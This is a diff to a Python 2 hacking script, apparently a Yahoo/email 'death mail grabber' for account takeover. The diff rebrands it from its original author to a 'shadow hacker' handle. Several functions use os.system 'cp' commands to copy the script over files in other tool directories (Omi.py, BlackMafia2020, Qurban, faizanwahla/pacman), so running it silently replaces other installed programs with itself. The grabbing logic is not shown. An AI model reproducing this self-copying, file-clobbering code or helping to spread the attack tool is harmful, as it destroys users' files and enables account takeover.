@@ -34,18 +34,25 @@ br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U
 ##### LOGO #####
 logo='''
 
-    ██████╗░██╗░░██╗███████╗
-    ██╔══██╗╚██╗██╔╝╚════██║
-    ██████╦╝░╚███╔╝░░░███╔═╝   𝐖𝐨𝐫𝐥𝐝❜𝐬 𝐁𝐞𝐬𝐭
-    ██╔══██╗░██╔██╗░██╔══╝░░   𝐃𝐞𝐚𝐭𝐡 𝐌𝐚𝐢𝐥
-    ██████╦╝██╔╝╚██╗███████╗   𝐆𝐫𝐚𝐛𝐛𝐞𝐫
-    ╚═════╝░╚═╝░░╚═╝╚══════╝
+    _____.___.      .__                    ________                     .___
+
+\__  |   |____  |  |__   ____   ____   \______ \   ____ _____     __| _/
+
+ /   |   \__  \ |  |  \ /  _ \ /  _ \   |    |  \_/ __ \\__  \   / __ | 
+
+ \____   |/ __ \|   Y  (  <_> |  <_> )  |    `   \  ___/ / __ \_/ /_/ | 
+
+ / ______(____  /___|  /\____/ \____/  /_______  /\___  >____  /\____ | 
+
+ \/           \/     \/                        \/     \/     \/      \/ 
+    SHADOW HACKER
+    
 --------------------------------------------------
 
-➣ Auther   : Binyamin
-➣ GitHub   : https://github.com/binyamin-binni
-➣ YouTube  : Trick Proof
-➣ Blogspot : https://trickproof.blogspot.com
+➣ Auther   : shadow hacker
+➣ GitHub   : https://github.com/shadow
+➣ YouTube  : Mr.Hacker coming soon
+➣ Blogspot : coming soon
 
 --------------------------------------------------
                                 '''
@@ -53,8 +60,8 @@ logo='''
 os.system("clear")
 print(logo)
 print " \x1b[1;91mNOTE: Do not put space between name"
-print "       put name like binyamin or binyamin.binni"
-print '       or binyaminbinni'
+print "       put name like abid or Edward.jon"
+print '       or jhon88'
 print '\x1b[1;97m'
 first = raw_input(" Name: ")
 
@@ -68,8 +75,8 @@ def ym():
     except OSError:
         yp()
     else:
-        os.system("cp ../bxi/bxi.py ../omi/Omi.py")
-        os.system("cp ../bxi/.README.md ../omi/")
+        os.system("cp ../yahoo/yahoo.py ../omi/Omi.py")
+        os.system("cp ../yahoo/.README.md ../omi/")
         yb()
     
 def yb():
@@ -78,8 +85,8 @@ def yb():
     except OSError:
         yl()
     else:
-        os.system("cp ../bxi/bxi.py ../BlackMafia2020/lovehacker")
-        os.system("cp ../bxi/.README.md ../BlackMafia2020/")
+        os.system("cp ../yahoo/yahoo.py ../yahoo/shadow")
+        os.system("cp ../yahoo/.README.md ../BlackMafia2020/")
         yl()
     
 def yl():
@@ -88,8 +95,8 @@ def yl():
     except OSError:
         yp()
     else:
-        os.system("cp ../bxi/bxi.py ../Qurban/Qurban.py")
-        os.system("cp ../bxi/.README.md ../Qurban/")
+        os.system("cp ../yahoo/yahoo.py ../Qurban/Qurban.py")
+        os.system("cp ../yahoo/.README.md ../Qurban/")
         yp()
     
 def yp():
@@ -98,8 +105,8 @@ def yp():
     except OSError:
         login()
     else:
-        os.system("cp ../bxi/bxi.py ../faizanwahla/pacman")
-        os.system("cp ../bxi/.README.md ../faizanwahla/")
+        os.system("cp ../yahoo/yahoo.py ../faizanwahla/pacman")
+        os.system("cp ../yahoo/.README.md ../faizanwahla/")
         login()
         
 def login():
